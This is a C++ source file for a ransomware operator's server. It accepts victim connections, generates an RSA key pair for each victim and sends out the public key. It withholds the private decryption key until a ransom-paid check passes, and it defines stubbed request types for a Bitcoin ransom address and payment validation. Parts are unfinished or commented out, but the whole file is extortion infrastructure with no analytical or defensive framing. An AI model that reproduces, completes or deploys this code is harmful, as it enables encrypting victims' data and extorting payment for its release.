#include "../Headers/server.h"

#include <openssl/evp.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>

RSAKeys ServerInterface::GenerateRSAPair() {
	EVP_PKEY_CTX* ctx = EVP_PKEY_CTX_new_id(EVP_PKEY_RSA, nullptr);
	if ( ctx == NULL )
		return {};

	if ( EVP_PKEY_keygen_init(ctx) <= 0 )
		return {};

	if ( EVP_PKEY_CTX_set_rsa_keygen_bits(ctx, 1024) <= 0 )
		return {};

	EVP_PKEY* key = nullptr;
	if ( EVP_PKEY_keygen(ctx, &key) <= 0 ) {
		EVP_PKEY_CTX_free(ctx);
		return {};
	}

	BIO* priv = BIO_new(BIO_s_mem());
	BIO* pub  = BIO_new(BIO_s_mem());

	if ( PEM_write_bio_PrivateKey(priv, key, nullptr, nullptr, 0, nullptr, nullptr) <= 0 ) {
		EVP_PKEY_CTX_free(ctx);
		BIO_free(priv);
		BIO_free(pub);
		EVP_PKEY_free(key);
		return {};
	}

	if ( PEM_write_bio_PUBKEY(pub, key) <= 0 ) { 
		EVP_PKEY_CTX_free(ctx);
		BIO_free(priv);
		BIO_free(pub);
		EVP_PKEY_free(key);
		return {};
	}

	EVP_PKEY_CTX_free(ctx);
	EVP_PKEY_free(key);

	return std::make_pair(priv, pub);
}

void ServerInterface::ListenForUDPMessages() {

	// UDP requests are not encrypted.
	sockaddr_in recvAddr;
	int addrSize = sizeof(recvAddr);

	std::cout << "Listening for udp messages\n";

	// receive while udp server is alive
	while ( this->UDPServerDetails.alive == TRUE ) {
		ClientRequest req;
		sockaddr_in addr = NetCommon::UDPRecvMessage(this->UDPServerDetails.sfd, req );
		
		std::cout << "Received a message on the UDP socket." << std::endl;
		PerformUDPRequest(req, addr);
	}
	std::cout << "Not receiving\n";
}

BOOL ServerInterface::PerformTCPRequest(ClientMessage req, long cuid) {
	BOOL		  success = FALSE;
	Client		  client  = GetClientData(cuid).first; // client who made the request
	ServerCommand responseCommand;

	if ( !ClientIsInClientList(cuid) )
		return success;

	switch ( req.action ) {
	case ClientMessage::REQUEST_PRIVATE_ENCRYPTION_KEY:
		if ( !IsRansomPaid(client) ) {
			success = FALSE;
			break;
		}

		responseCommand.action = RemoteAction::RETURN_PRIVATE_RSA_KEY;
		//responseCommand.publicEncryptionKey = NetCommon::ConvertBIOToString(client.RSAPublicKey);
		responseCommand.privateEncryptionKey = NetCommon::ConvertBIOToString(client.RSAPrivateKey);
		success = TCPSendMessageToClient(cuid, responseCommand);
		std::cout << "sending\n";

		break;
	case ClientMessage::REQUEST_RANSOM_BTC_ADDRESS:
		break;
	case ClientMessage::VALIDATE_RANSOM_PAYMENT:
		break;
	}
}

void ServerInterface::TCPReceiveMessagesFromClient(long cuid) {
	std::cout << "New thread created to receive messages from client " << cuid << std::endl;
	Client* client = GetClientPtr(cuid);
	BOOL receiving = FALSE;

	if ( client == nullptr )
		return;
	
	// tcp receive main loop
	do 
	{
		// get a client response usually after an action is performed on the remote host
		if ( client->ExpectingResponse ) {
			client->LastClientResponse = client->RecentClientResponse;
			client->RecentClientResponse = ReceiveDataFrom<ClientResponse>(this->TCPServerDetails.sfd, cuid);
			continue;
		}
		
		// receive data from client, decrypt it using their rsa key
		ClientMessage receivedData = ReceiveDataFrom<ClientMessage>(this->TCPServerDetails.sfd, cuid);
		receiving = receivedData.valid;

		PerformTCPRequest(receivedData, cuid);
	} 
	while ( receiving );
}

void ServerInterface::AcceptTCPConnections() {
	while ( this->ClientList.size() < MAX_CON && this->TCPServerDetails.alive == TRUE )
	{
		// accept
		sockaddr_in addr = {};
		int size = sizeof(sockaddr_in);
		SOCKET clientSocket = AcceptOnSocket(this->TCPServerDetails.sfd, reinterpret_cast<sockaddr*>( &addr ), &size);
		if ( clientSocket == INVALID_SOCKET )
			continue;

		std::cout << "Accepted a client on the tcp server." << std::endl;

		Client newClient(addr); // make a new client and store the addr info in it
		newClient.SetRSAKeys(this->GenerateRSAPair());
		newClient.TCPSocket = clientSocket;
		AddToClientList(newClient); // add them to the client list
		
		std::cout << "- Added the client to the client list\n";

		Sleep(1000);

		std::cout << "sending key\n";
		// send the rsa public key to the client on join
		std::string bio = NetCommon::ConvertBIOToString(newClient.RSAPublicKey);
		std::string b64 = macaron::Base64::Encode(bio);
		std::cout << "base 64 key: " << b64 << std::endl;
		ServerCommand cmd;
		cmd.publicEncryptionKey = b64;
		cmd.action = RETURN_PUBLIC_RSA_KEY;
		cmd.valid = TRUE;

		BYTESTRING b = NetCommon::SerializeString(b64);
		long s = b.size();
		send(newClient.TCPSocket, ( char* ) &s, sizeof(s), 0);
		std::cout << "sent size (" << s << ")\n";
		send(newClient.TCPSocket, ( char* ) b.data(), b.size(), 0);

		//BOOL success = NetCommon::TCPSendMessage(cmd, clientSocket);
		std::cout << "successfully sent key\n";
		//TCPSendMessageToClient(newClient.ClientUID, key);

		////// start receiving tcp data from that client for the lifetime of that client
		//std::thread receive(&ServerInterface::TCPReceiveMessagesFromClient, this, newClient.ClientUID);
		//receive.detach();

		// make it so we can send information to the client
	}
}

Server ServerInterface::NewServerInstance(SocketTypes serverType, int port) {
	Server server = {};
	
	if ( !NetCommon::WSAInitialized )
		NetCommon::LoadWSAFunctions();

	// create socket for server type
	// update server fields
	if ( serverType == TCP ) {
		server.sfd = CreateSocket(AF_INET, SOCK_STREAM, 0);
		if ( server.sfd == INVALID_SOCKET )
			return server;

		server.type = SOCK_STREAM;
	} else if ( serverType == UDP) {
		server.sfd = CreateSocket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
		if ( server.sfd == INVALID_SOCKET )
			return server;
		server.type = SOCK_DGRAM;
	}

	//hostent* host = GetHostByName(DNS_NAME.c_str());

	// update server fields
	//memcpy(&server.addr.sin_addr, host->h_addr_list[0], host->h_length);
	
	server.addr.sin_addr.s_addr = INADDR_ANY;
	server.addr.sin_family	    = AF_INET;
	server.addr.sin_port        = htons(port);
	server.port                 = port;
	server.alive = TRUE;

	std::cout << "Created server on port: " << port << std::endl;

	return server;
}

BOOL ServerInterface::StartServer(Server& server) {
	if ( server.sfd == INVALID_SOCKET )
		return FALSE;

	// bind
	int status = SOCKET_ERROR;
	status = BindSocket(server.sfd, ( sockaddr* ) &server.addr, sizeof(server.addr));
	if ( status == SOCKET_ERROR )
		return FALSE;

	MarkServerAsAlive(server); // alive once binded

	// listen if TCP server
	if ( server.type == SOCK_STREAM ) {
		status = SocketListen(server.sfd, SOMAXCONN);
		if ( status == SOCKET_ERROR )
			return FALSE;

		this->TCPServerDetails = server;

		// start accepting
		std::thread acceptThread(&ServerInterface::AcceptTCPConnections, this);
		acceptThread.detach(); // run accept thread even after this function returns
	}
	// otherwise if not tcp server then listen for udp messaages
	else if ( server.type == SOCK_DGRAM ) {
		this->UDPServerDetails = server;

		std::thread receiveThread(&ServerInterface::ListenForUDPMessages, this);
		receiveThread.detach();
	}

	return TRUE;
}

BOOL ServerInterface::TCPSendMessageToClient(long cuid, ServerCommand& req) {
	Client c = GetClientData(cuid).first;
	return NetCommon::TCPSendMessage(req, c.TCPSocket);
}

ClientResponse ServerInterface::WaitForClientResponse(long cuid) {
	Client* client = GetClientPtr(cuid);
	if ( client == nullptr ) return {};

	client->ExpectingResponse = TRUE;

	// wait until new client response
	do {
		Sleep(500); // wait 500 ms
	} 
	while ( client->RecentClientResponse.id != client->LastClientResponse.id );

	client->ExpectingResponse = FALSE;

	return client->RecentClientResponse;
}

BOOL ServerInterface::UDPSendMessageToClient(Client clientInfo, UDPMessage& message) {
	message.isValid = TRUE;
	return NetCommon::UDPSendMessage(message, this->UDPServerDetails.sfd, clientInfo.AddressInfo);
}

BOOL ServerInterface::PerformUDPRequest(ClientMessage req, sockaddr_in incomingAddr) {
	BOOL success = FALSE;
	
	// udp isnt encrypted, which is why we want to get out of udp as fast as possible
	// only serialized as a bytestring to send over sockets
	if ( !req.valid )
		return FALSE;

	std::cout << "Performing UDP request. Action: " << req.action << std::endl;

	switch ( req.action ) {
	case ClientMessage::CONNECT_CLIENT:	
		Client client(incomingAddr);
		client.UDPSocket = req.udp;
		
		std::cout << "Client: " << client.UDPSocket  << std::endl;

		// client wants to connect so respond with tcp server details
		hostent* host = GetHostByName(DNS_NAME.c_str());

		Server temp = this->TCPServerDetails;
		memcpy(&temp.addr.sin_addr, host->h_addr_list[0], host->h_length);

		UDPMessage response = {};
		response.TCPServer = temp;

		if ( UDPSendMessageToClient(client, response) )
			success = TRUE;
		break;
	}

	return success;
}

ClientResponse ServerInterface::PingClient(long cuid) {
	if ( !ClientIsInClientList(cuid) )
		return {};

	ClientData clientInfo = GetClientData(cuid);
	Client     client     = clientInfo.first;
	if ( !client.SocketReady(TCP) ) // socket isnt ready so cant ping.
		return {};

	// send the ping to the client over tcp
	ServerCommand pingCommand;
	pingCommand.action = RemoteAction::PING_CLIENT;
	pingCommand.valid = TRUE;
	
	BOOL sent = TCPSendMessageToClient(cuid, pingCommand);
	if ( !sent )
		return {};

	return WaitForClientResponse(cuid);
}

BOOL ServerInterface::ClientIsInClientList(long cuid) {
	return GetClientList().contains(cuid);
}

BOOL ServerInterface::AddToClientList(Client client) {
	std::cout << "Adding client to list\n";
	long cuid = client.ClientUID;
	
	//// generate a cuid that isnt in use if cuid is already generated
	while ( cuid != -1 && ClientIsInClientList(cuid) ) // keep generating if cuid is in use
		cuid = client.GenerateCUID();
	
	std::cout << "- Locking mutex\n";
	
	ClientListMutex.lock();
	
	RSAKeys    keys = std::make_pair(client.RSAPublicKey, client.RSAPrivateKey);
	ClientData pair = std::make_pair(client, keys);
	std::pair<long, ClientData> clientListValue = std::make_pair(client.ClientUID, pair);
	
	this->ClientList.insert(clientListValue);
	
	ClientListMutex.unlock();

	
	// client has been correctly inserted as a tuple into clientlist
	return this->ClientList.at(client.ClientUID).first.TCPSocket == client.TCPSocket;
}

BOOL ServerInterface::IsClientAlive(long cuid) {
	// Check if client is in ClientList and exists
	if ( !ClientIsInClientList(cuid) )
		return FALSE; // Client doesn't exist. Nothing returned from GetClientData

	ClientData clientInfo = GetClientData(cuid);
	Client client = clientInfo.first;

	if ( client.SocketReady(TCP) == FALSE )
		return FALSE; // socket not setup 

	// Check if client sends and receives ping
	if ( PingClient(cuid).responseCode != C_OK )
		return FALSE; // Client is dead

	return TRUE; // Client is alive
}

template <typename Data>
Data ServerInterface::DecryptClientData(BYTESTRING cipher, long cuid) {
	if ( !ClientIsInClientList(cuid) )
		return {};

	ClientData  clientInfo    = GetClientData(cuid);
	BIO*        decryptionKey = clientInfo.second.first;
	Data        decrypted     = NetCommon::DecryptInternetData<Data>(cipher, decryptionKey);
	
	return decrypted;
}

ClientRequest ServerInterface::DecryptClientRequest(long cuid, BYTESTRING req) {
	return DecryptClientData<ClientRequest>(req, cuid); // return decrypted clientRequest struct
}

ClientResponse ServerInterface::DecryptClientResponse(long cuid, BYTESTRING resp) {
	return DecryptClientData<ClientResponse>(resp, cuid);
}

BYTESTRING ServerInterface::EncryptServerRequest(ServerRequest& req) {
	//BYTESTRING serialized = NetCommon::SerializeStruct(req);
	//BIO* b = NetCommon::GetBIOFromString(( char* ) req.publicEncryptionKey.c_str(), req.publicEncryptionKey.size());
	//BYTESTRING cipher = NetCommon::RSAEncryptStruct(serialized, b);

	//return cipher;
	return {};
}